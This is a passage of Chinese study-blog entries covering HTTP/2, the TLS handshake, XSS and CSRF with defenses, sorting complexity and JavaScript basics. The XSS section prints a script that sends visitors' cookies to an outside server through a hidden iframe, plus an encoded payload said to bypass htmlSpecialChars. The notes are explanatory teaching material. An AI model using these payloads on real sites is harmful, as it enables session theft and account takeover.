<h4 id="头信息压缩"><a href="#头信息压缩" class="headerlink" title="头信息压缩"></a>头信息压缩</h4><p>由于每次请求，很多<strong>请求头信息中的字段都是重复的</strong>（如Cookie、User Agent等），这会造成很多带宽的浪费。HTTP/2优化了这一点，引入<strong>头信息压缩机制</strong>。一方面，头信息<strong>使用<code>gzip</code><strong>等方法压缩后再发送；另一方面，客户端和服务端维护一张</strong>头信息表</strong>，该表为<strong>字段和索引号的映射</strong>，之后就只发送索引号，以提高速度。</p>
<h4 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h4><p>HTTP/2允许服务器未收到请求，主动向客户端发送资源。</p>
<p>例如：客户端请求一个包含很多静态资源的网页，服务器会主动把这些静态资源随网页一起发送给客户端，这样就不需要等客户端收到网页后解析HTML发现有静态资源再请求静态资源了。</p>
<h2 id="HTTPS——番外篇"><a href="#HTTPS——番外篇" class="headerlink" title="HTTPS——番外篇"></a>HTTPS——番外篇</h2><p>互联网的通信安全是建立在<strong>SSL/TLS</strong>协议之上的。</p>
<p><strong>注</strong>：SSL——<strong>Secure Sockets Layer</strong>, TLS——SSL的升级</p>
<h3 id="使用HTTPS的原因-amp-作用"><a href="#使用HTTPS的原因-amp-作用" class="headerlink" title="使用HTTPS的原因&amp;作用"></a>使用HTTPS的原因&amp;作用</h3><p><strong>对比：</strong></p>
<ul>
<li><p>HTTP不使用SSL/TLS，因此是不加密的通信，所有信息都是明文传播</p>
<ol>
<li><strong>窃听风险（eavesdropping）：</strong>第三方可以截获并获知通信内容</li>
<li><strong>篡改风险（tampering）：</strong>第三方可以截获并修改通信内容</li>
<li><strong>冒充风险（pretending）：</strong>第三方可以冒充他人身份参与通信</li>
</ol>
</li>
<li><p>基于SSL/TLS协议的HTTPS的好处</p>
<ol>
<li><strong>所有信息都是加密传输</strong>——无法被窃听</li>
<li><strong>具有校验机制</strong>——通信内容一旦被篡改，通信双方都能发现</li>
<li><strong>配备身份证书</strong>——防止身份冒充</li>
</ol>
</li>
</ul>
<h3 id="SSL-TLS协议的基本运行过程"><a href="#SSL-TLS协议的基本运行过程" class="headerlink" title="SSL/TLS协议的基本运行过程"></a>SSL/TLS协议的基本运行过程</h3><p>该协议的基本思路为：<strong>非对称加密：公钥加密，私钥解密</strong>。即客户端先向服务端索要公钥，然后再用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p>
<ol>
<li><p><strong>保证公钥不被篡改的方法</strong></p>
<p>答：将<strong>公钥放入数字证书</strong>中，只要证书是可信的，那么公钥就是可信的。</p>
</li>
<li><p><strong>用公钥加密计算量太大，需要减少耗用时间的方法</strong></p>
<p>答：每一次对话（session），客户端和服务端会生成一个“对话密钥”（session key），用它来加密信息。由于“对话密钥”是对称加密，因此运算速度非常快，因此如果服务器公钥只用于加密“对话密钥”本身的话，就会大大减少加密运算的消耗时间。</p>
</li>
</ol>
<p>所以，SSL/TLS协议的基本过程是：</p>
<ol>
<li>客户端向服务端<strong>索要并验证公钥</strong> —— 握手阶段</li>
<li>双方协商<strong>生成“对话密钥”</strong>              —— 握手阶段</li>
<li>双方采用“对话密钥”<strong>进行加密通信</strong></li>
</ol>
<h3 id="握手阶段"><a href="#握手阶段" class="headerlink" title="握手阶段"></a>握手阶段</h3><p>握手阶段涉及四次通信，该阶段的所有通信都是明文的。</p>
<h4 id="阶段一：客户端发出请求"><a href="#阶段一：客户端发出请求" class="headerlink" title="阶段一：客户端发出请求"></a>阶段一：客户端发出请求</h4><p>首先，客户端向服务器发送加密通信请求。其发送的请求内容主要有以下：</p>
<ol>
<li>支持的协议版本，例如：TLS 1.0</li>
<li>客户端生成的随机数，用于稍后生成“对话密钥”</li>
<li>支持的加密方法，例如：RSA公钥加密</li>
<li>支持的压缩方法</li>
</ol>
<h4 id="阶段二：服务器回应"><a href="#阶段二：服务器回应" class="headerlink" title="阶段二：服务器回应"></a>阶段二：服务器回应</h4><p>服务器收到客户端请求后，向客户端发出响应。响应内容主要包括以下：</p>
<ol>
<li>确认使用的加密通信协议版本。如果双方支持的版本不一致，则服务器会关闭本次加密通信</li>
<li>服务器生成的随机数，用于稍后生成“对话密钥”</li>
<li>确认使用的加密方法</li>
<li>服务器证书</li>
</ol>
<h4 id="阶段三：客户端回应"><a href="#阶段三：客户端回应" class="headerlink" title="阶段三：客户端回应"></a>阶段三：客户端回应</h4><p>客户端收到服务器的响应后，首先要验证服务器的数字证书。</p>
<p>如果<strong>1. 证书不可信。2. 证书中的域名与实际域名不一致。3. 证书已经过期</strong>，就会向访问者显示一个警告，让其选择是否继续通信。</p>
<p>如果证书没有问题，客户端会<strong>从证书中取出服务器的公钥</strong>，然后向服务器发送响应，其内容主要如下：</p>
<ol>
<li>客户端生成的随机数。该随机数用公钥加密，防止被窃听。</li>
<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
<li>客户端握手结束通知。表示客户端的握手阶段结束，这一项也是前面发送的所有内容的hash值，用来供服务器校验。</li>
</ol>
<p><strong>注：</strong>这个阶段生成的随机数是整个握手阶段出现的第三个随机数（”pre-master key”）。有了它之后，客户端和服务器就都同时有了三个随机数，然后双方用事先商定的加密方法，各自生成本次会话所用的同一把“会话密钥”。</p>
<h4 id="阶段四：服务器最后回应"><a href="#阶段四：服务器最后回应" class="headerlink" title="阶段四：服务器最后回应"></a>阶段四：服务器最后回应</h4><p>服务器收到第三个随机数之后，会计算生成本次会话所用的“会话密钥”。然后向客户端发送最后响应。其内容主要如下：</p>
<ol>
<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
<li>服务器握手结束通知。表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。</li>
</ol>
<p>至此，整个握手阶段全部结束。接下来就是，客户端与服务器进行加密通信，这就完全是<strong>使用普通的HTTP协议</strong>了，只不过所<strong>发送的内容都使用“会话密钥”进行了加密</strong>。</p>
<h2 id="网络安全篇"><a href="#网络安全篇" class="headerlink" title="网络安全篇"></a>网络安全篇</h2><h3 id="XSS——跨站脚本"><a href="#XSS——跨站脚本" class="headerlink" title="XSS——跨站脚本"></a>XSS——跨站脚本</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>XSS，全称为<strong>Cross-site scripting</strong>，中文名称为跨站脚本，是一种<strong>对网络应用程序的安全漏洞的攻击</strong>，即是一种<strong>代码注入</strong>。这类攻击通常包含了HTML和用户脚本语言（主要为JavaScript）。</p>
<p>例如，用JavaScript在网站论坛上发布一段恶意的JavaScript代码，这就是脚本注入，而同时如果这个代码内容有请求外部服务器的功能，那么就叫做XSS。</p>
<p>因此，可以理解为<strong>XSS（跨站脚本）= 脚本注入 + 请求外部服务器的功能</strong>。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>例如，在某论坛网站中的发帖内容写下如下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;一直弹窗&#x27;</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>假设该论坛网站没有任何过滤及其它防御机制的情况下，任何访问这个帖子的用户，都会在客户端界面一直弹出这个弹窗。</p>
<p><strong>这就是最简单的脚本注入。</strong>当然这个脚本并没有什么实质性的危害，那么XSS就是基于脚本注入的方法来完成，但它注入的是含有请求跨站功能的脚本。</p>
<p>例如，在上面提到的论坛网站中，注入如下代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  (<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span>, <span class="built_in">document</span></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 构造泄露信息用的 URL</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURIBase = <span class="string">&quot;http://192.168.123.123/myxss/&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line"><span class="javascript">    hideFrame.style.display = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line"><span class="javascript">    <span class="comment">// 开工</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span></span><br><span class="line"><span class="javascript">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>该段代码会将任何访问该帖子的用户的cookie传给一个为<code>http://192.168.123.123/myxss/</code>的服务器，该服务器可以拿着这个cookie访问对应的网站，并登录该用户的账号，继而可以进行其它操作。</p>
<p>因此，上面这段代码就是XSS。</p>
<h3 id="CSRF——跨站请求伪造"><a href="#CSRF——跨站请求伪造" class="headerlink" title="CSRF——跨站请求伪造"></a>CSRF——跨站请求伪造</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>CSRF，全称为<strong>Cross-site request forgery</strong>，中文名为跨站请求伪造。是一种让用户在当前已登录的Web应用程序上<strong>执行一些非本意的操作</strong>（如改名，删帖，发邮件等）的攻击方法。</p>
<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>一般来说，CSRF是由XSS实现的，在跨站脚本的基础上，实现伪造请求，导致受害者会执行一些自己本不愿意执行的操作。</p>
<p><strong>注：CSRF也可以不通过XSS来实现。</strong></p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>还是以上面的对某论坛网站的XSS攻击为例，在外部服务器成功获得用户的cookie后，它可以利用cookie，伪造成用户对论坛网站发起一系列的请求，例如修改用户名称，修改用户密码等。此时，就可以称该攻击为CSRF。</p>
<h3 id="防范XSS和CSRF⭐️"><a href="#防范XSS和CSRF⭐️" class="headerlink" title="防范XSS和CSRF⭐️"></a>防范XSS和CSRF⭐️</h3><p><em><strong>核心思想：不相信任何外部来源数据！！！</strong></em></p>
<p>一般来说，大部分的CSRF都是基于XSS的，因此可以说防住了XSS，也就基本防住了CSRF。</p>
<p>对于防范XSS，主要有以下两个方法：</p>
<ol>
<li><strong>输入过滤：对外部输入进行彻底的敏感字符过滤</strong>——前端+后端</li>
<li><strong>输出过滤：在显示在页面上时，做一些处理让敏感的代码脚本无法顺利执行</strong>——前端</li>
</ol>
<p>理论上，只要有输入数据的的地方，就存在XSS的漏洞，JavaScript的脚本可以以各种形式（如明文、编码等）注入到数据库中。</p>
<p>就像上面提到的 JS 会以各种非法形式注入，其主要非法形式有两类：</p>
<ol>
<li><p><strong>明文：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js 恶意代码</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>​        要处理好明文注入的过滤。</p>
</li>
<li><p><strong>编码：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
<p>上面这个编码为unicode编码，它可以绕过<code>htmlSpecialChars</code>的过滤并入库，然后在展示该信息的时候，html 会自动将unicode编码转换成明文即真正的可执行脚本。</p>
<p>由于不仅unicode编码可以注入，其它类型的编码也可以（道理类似），我们需要尽量将页面的字符编码统一设置为一种（如unicode: utf-8），这样便于我们专注于处理unicode编码的注入。</p>
</li>
</ol>
<h4 id="其它一些通用的防范方法"><a href="#其它一些通用的防范方法" class="headerlink" title="其它一些通用的防范方法"></a>其它一些通用的防范方法</h4><ol>
<li><p>在输出html时，加上<code>Content Security Policy</code>的<code>Http Header</code></p>
<p>作用：防止页面被XSS攻击时，嵌入第三方的脚本文件</p>
</li>
<li><p>在设置Cookie时，加上<code>HttpOnly</code>参数</p>
<p>作用：可以防止页面被XSS攻击时，Cookie信息被盗取</p>
<p>缺点：网站本身的<code>JavaScript</code>代码也无法操作Cookie</p>
</li>
<li><p>在开发API时，检验请求的Referer参数</p>
<p>作用：可以在一定程度上防止CSRF攻击</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Handy CheatSheet</title>
    <url>/2021/10/27/Handy-CheatSheet/</url>
    <content><![CDATA[<h1 id="Algorithm-Time-Complexity"><a href="#Algorithm-Time-Complexity" class="headerlink" title="Algorithm Time Complexity"></a>Algorithm Time Complexity</h1><table>
<thead>
<tr>
<th align="center">Algorithm</th>
<th align="center">Best Time Complexity</th>
<th align="center">Ave TC</th>
<th align="center">Worst TC</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Selection Sort</td>
<td align="center">Ω($n^2$)</td>
<td align="center">Θ($n^2$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center">Bubble Sort</td>
<td align="center">Ω($n$)</td>
<td align="center">Θ($n^2$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center">Insertion Sort</td>
<td align="center">Ω($n$)</td>
<td align="center">Θ($n^2$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center"><strong>Heap Sort</strong></td>
<td align="center">Ω($nlogn$)</td>
<td align="center">Θ($nlogn$)</td>
<td align="center"><strong>O($nlogn$)</strong></td>
</tr>
<tr>
<td align="center"><strong>Quick Sort</strong></td>
<td align="center">Ω($nlogn$)</td>
<td align="center">Θ($nlogn$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center"><strong>Merge Sort</strong></td>
<td align="center">Ω($nlogn$)</td>
<td align="center">Θ($nlogn$)</td>
<td align="center"><strong>O($nlogn$)</strong></td>
</tr>
<tr>
<td align="center">Bucket Sort</td>
<td align="center">Ω($n+k$)</td>
<td align="center">Θ($n+k$)</td>
<td align="center">O($n^2$)</td>
</tr>
<tr>
<td align="center">Radix Sort</td>
<td align="center">Ω($nk$)</td>
<td align="center">Θ($nk$)</td>
<td align="center">O($nk$)</td>
</tr>
</tbody></table>
<a id="more"></a>

<h1 id="Time-Complexity-Rank"><a href="#Time-Complexity-Rank" class="headerlink" title="Time Complexity Rank"></a>Time Complexity Rank</h1><ol>
<li>O($logn$)    ——————–    e.g. Binary Tree</li>
<li>O($n$)          ——————–    e.g. Simple Search</li>
<li>O($nlogn$)  ——————–    e.g. Quick Sort</li>
</ol>
<hr>
<ol start="4">
<li>O($n^2$)        ——————–     e.g. Selection Sort (Not Recommended Time Complexity)</li>
</ol>
<h1 id="Java-IDEA-IDE-ShortCut"><a href="#Java-IDEA-IDE-ShortCut" class="headerlink" title="Java IDEA IDE ShortCut"></a>Java IDEA IDE ShortCut</h1><ol>
<li>sout + enter</li>
<li>psvm + enter</li>
<li>fori + enter</li>
<li>iter + enter</li>
</ol>
]]></content>
      <categories>
        <category>Algorithm/算法</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript琐碎基础---学习手记</title>
    <url>/2021/09/24/JavaScriptBasics/</url>
    <content><![CDATA[<p><strong>JavaScript语语法基础部分一览，包括面试常见的“深浅拷贝”、数据结构操作（如数组插入等）需熟记于心。</strong></p>
<a id="more"></a>

<h1 id="条件运算符"><a href="#条件运算符" class="headerlink" title="? 条件运算符"></a>? 条件运算符</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> result = condition ? value1 : value2;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>如果条件为真，则返回<code>value1</code>；否则，返回<code>value2</code></p>
<h1 id="‘-’空值合并"><a href="#‘-’空值合并" class="headerlink" title="‘??’空值合并"></a>‘??’空值合并</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res = a ?? b;</span><br></pre></td></tr></table></figure>
<ol>
<li>如果a已定义，则结果为a</li>
<li>否则，结果为b</li>
</ol>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">alert(user ?? <span class="string">&quot;Anonymous&quot;</span>);</span><br></pre></td></tr></table></figure>
<h1 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h1><h2 id="Object-assign（浅拷贝）"><a href="#Object-assign（浅拷贝）" class="headerlink" title="Object.assign（浅拷贝）"></a>Object.assign（浅拷贝）</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(target_object, [source_object1, source_object2, source_object3...])</span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123; <span class="attr">name</span>:<span class="string">&quot;Will&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> info = &#123;<span class="attr">age</span>: <span class="number">18</span>, <span class="attr">grade</span>: <span class="string">&quot;Master&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> drive = &#123;<span class="attr">canDrive</span>: <span class="literal">true</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(user, info, drive); <span class="comment">// user = &#123;name:&quot;Will&quot;, age: 18, grade: &quot;Master&quot;, canDrive: true&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> new_user = <span class="built_in">Object</span>.assign(&#123;&#125;, user, info, drive); <span class="comment">// 返回一个新的对象</span></span><br></pre></td></tr></table></figure>
<p><strong>使用for loop实现</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  name : <span class="string">&quot;Will&quot;</span>,</span><br><span class="line">  age : <span class="number">18</span>,</span><br><span class="line">  grade: <span class="string">&quot;Master&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> clone = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> user) &#123;</span><br><span class="line">  clone[key] = user[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="深层克隆（深拷贝）"><a href="#深层克隆（深拷贝）" class="headerlink" title="深层克隆（深拷贝）"></a>深层克隆（深拷贝）</h2><p><em><strong>由于上述的对象克隆（无论是for loop还是Object.assign）都是假设所有的属性为原始类型，但是对于对象的引用类型，则会失效。因为它会直接复制其引用，因此双方仍然会共用一个属性值</strong></em></p>
<p><strong>因此，我们需要深层克隆。</strong></p>
<h3 id="Json-parse-JSON-stringify-xxxx-—-通常"><a href="#Json-parse-JSON-stringify-xxxx-—-通常" class="headerlink" title="Json.parse(JSON.stringify(xxxx)) — 通常"></a>Json.parse(JSON.stringify(xxxx)) — 通常</h3><ul>
<li>Pros：简单易用</li>
<li>Cons：<pre><code>1. 会忽略undefined
 2. 会忽略symbol
 3. 不能序列化函数
 4. 不能解决循环引用的问题
</code></pre>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  age : <span class="number">10</span>,</span><br><span class="line">  jobs: &#123;</span><br><span class="line">    first: <span class="string">&quot;police&quot;</span>,</span><br><span class="line">    second: <span class="string">&quot;pilot&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(a));</span><br><span class="line"></span><br><span class="line">a.jobs.first = <span class="string">&quot;programmer&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b.jobs.first); <span class="comment">// police</span></span><br></pre></td></tr></table></figure>
<h3 id="MessageChannel（消息通道）"><a href="#MessageChannel（消息通道）" class="headerlink" title="MessageChannel（消息通道）"></a>MessageChannel（消息通道）</h3><ul>
<li><p>Pros：</p>
<pre><code>1. 能解决undefined
 2. 能解决循环引用
</code></pre>
</li>
<li><p>Cons：异步函数</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    		<span class="keyword">const</span> &#123;port1, port2&#125; = <span class="keyword">new</span> MessageChannel();</span><br><span class="line">    		port2.onmessage = <span class="function">(<span class="params">ev</span>)=&gt;</span>&#123;resolve(ev.data);&#125;</span><br><span class="line">        port1.postMessage(obj);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="comment">//之后再看</span></span><br></pre></td></tr></table></figure>
<h1 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h1><p><em><strong>简言之：JS引擎有一个被称作垃圾回收器的东西在后台自动运行，它监控所有对象的状态，然后删除那些已经不可达的对象（即不能访问到它了）</strong></em></p>
<h1 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p><strong>约定：</strong></p>
<ol>
<li>命名以大写字母开头</li>
<li>只能由new操作符来执行</li>
</ol>
<h1 id="可选链"><a href="#可选链" class="headerlink" title="可选链  ?."></a>可选链  ?.</h1><p><strong>简言之：</strong>如果可选链前面的部分是null或undefined则返回undefined；否则，返回该部分以及后面的访问属性</p>
<p><code>value?.prop</code>:</p>
<p>注：这里的不存在指的是该变量为null和undefined</p>
<ul>
<li>如果value存在，则返回value.prop</li>
<li>如果value不存在（即为null或undefined），则返回undefined，而不会像直接用<code>value.prop</code>一样报错</li>
</ul>
<p><strong>例子：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">user?.address?.name; <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> admin = &#123;<span class="attr">name</span>: <span class="string">&quot;Will&quot;</span>&#125;;</span><br><span class="line">admin?.name; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">admin?.age; <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p><strong>扩展</strong></p>
<p><code>obj?.prop</code></p>
<p><code>obj?.[prop]</code></p>
<p><code>obj.methodName?.()</code></p>
<p><strong>最后</strong></p>
<p>注意使用<code>?.</code>时，一定要确保其前面的变量<em><strong>已经声明</strong></em>，否则同样会报错</p>
<h1 id="Symbol类型"><a href="#Symbol类型" class="headerlink" title="Symbol类型"></a>Symbol类型</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>“Symbol”表示唯一的标识符，使用Symbol()来创建这种类型的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> uniqueId = <span class="built_in">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> uniqueId2 = <span class="built_in">Symbol</span>(<span class="string">&quot;id&quot;</span>); <span class="comment">// &quot;id&quot;为Symbol的一个描述</span></span><br></pre></td></tr></table></figure>
<p><strong>Symbol保证唯一性，即使具有相同描述的Symbol，它们的值也不同</strong></p>
<h3 id="Symbol不会被自动转化为字符串"><a href="#Symbol不会被自动转化为字符串" class="headerlink" title="Symbol不会被自动转化为字符串"></a>Symbol不会被自动转化为字符串</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> uniqueId = <span class="built_in">Symbol</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">uniqueId.toString(); <span class="comment">// Symbol(uniqueId)</span></span><br></pre></td></tr></table></figure>
<h2 id="Symbol可以用来创建对象的“隐藏”属性"><a href="#Symbol可以用来创建对象的“隐藏”属性" class="headerlink" title="Symbol可以用来创建对象的“隐藏”属性"></a>Symbol可以用来创建对象的“隐藏”属性</h2><h2 id="可以作为对象的属性键"><a href="#可以作为对象的属性键" class="headerlink" title="可以作为对象的属性键"></a>可以作为对象的属性键</h2><p><strong>注：</strong>在对象字面量{…}中使用Symbol作为属性键时，需要将它用方括号括起来</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="built_in">Symbol</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  name: <span class="string">&quot;will&quot;</span>,</span><br><span class="line">  [id]: <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Symbol在for…in循环中会跳出，但Object.assign方法却不会忽略symbol属性键</strong></p>
<h2 id="全局Symbol注册表"><a href="#全局Symbol注册表" class="headerlink" title="全局Symbol注册表"></a>全局Symbol注册表</h2><p><strong>注：</strong>使用<code>Symbol.for(&quot;key&quot;)</code>的方式从全局注册表中读取描述为key的Symbol，如果不存在则创建一个新的Symbol（Symbol(key)），并通过给定的key将其存储在注册表中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>反向调用</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sym = <span class="built_in">Symbol</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="built_in">Symbol</span>.keyFor(sym); <span class="comment">// id</span></span><br></pre></td></tr></table></figure>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><h3 id="toString-base"><a href="#toString-base" class="headerlink" title="toString(base)"></a>toString(base)</h3><ul>
<li><p>base表示进制，例如base=2，就以二进制的形式进行返回该数的字符串形式</p>
</li>
<li><p>base的范围是2-36，常用的是2、16、36</p>
</li>
<li><p>如果在数字上直接调用该方法，则要使用2个点。如；<code>100..toString(2)</code>，第一个点JS识别为小数点</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">num.toString(<span class="number">2</span>); <span class="comment">// &#x27;10&#x27;</span></span><br><span class="line">num.toString(<span class="number">10</span>); <span class="comment">// &#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="舍入rounding"><a href="#舍入rounding" class="headerlink" title="舍入rounding"></a>舍入rounding</h3><ul>
<li><strong>Math.floor</strong>     向下取整</li>
<li><strong>Math.ceil</strong>        向上取整</li>
<li><strong>Math.round</strong>   四舍五入</li>
<li><strong>Math.trunc</strong>    舍去小数点后</li>
<li><strong>toFixed(n)</strong>       四舍五入保留小数点后n位，返回一个字符串</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">12.36</span>;</span><br><span class="line">num.toFixed(<span class="number">1</span>); <span class="comment">// 12.4</span></span><br></pre></td></tr></table></figure>
<h3 id="不精确计算"><a href="#不精确计算" class="headerlink" title="不精确计算"></a>不精确计算</h3><h4 id="0-1-0-2-0-3"><a href="#0-1-0-2-0-3" class="headerlink" title="0.1 + 0.2 !== 0.3"></a>0.1 + 0.2 !== 0.3</h4><p><strong>原因：</strong>0.1 + 0.2的结果为0.3000…04。这是因为数字以其二进制的形式存储在内存中，即一个1和0的序列，同时在二进制中，可以保证以2为整数次幂能精确存储，因此0.1和0.2在二进制中均为无限二进制，无法被精确存储。</p>
<p><strong>解决方法：</strong>使用<code>toFixed()</code>舍去小数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sum = <span class="number">0.1</span> + <span class="number">0.2</span>;</span><br><span class="line">sum.toFixed(<span class="number">2</span>); <span class="comment">// &#x27;0.30&#x27;</span></span><br><span class="line">+sum.toFixed(<span class="number">2</span>); <span class="comment">// 0.3</span></span><br></pre></td></tr></table></figure>
<h3 id="isFinite和isNaN"><a href="#isFinite和isNaN" class="headerlink" title="isFinite和isNaN"></a>isFinite和isNaN</h3><ul>
<li>Infinity &amp; -Infinity 表示无穷大</li>
<li>NaN表示<code>Not-A-Number</code></li>
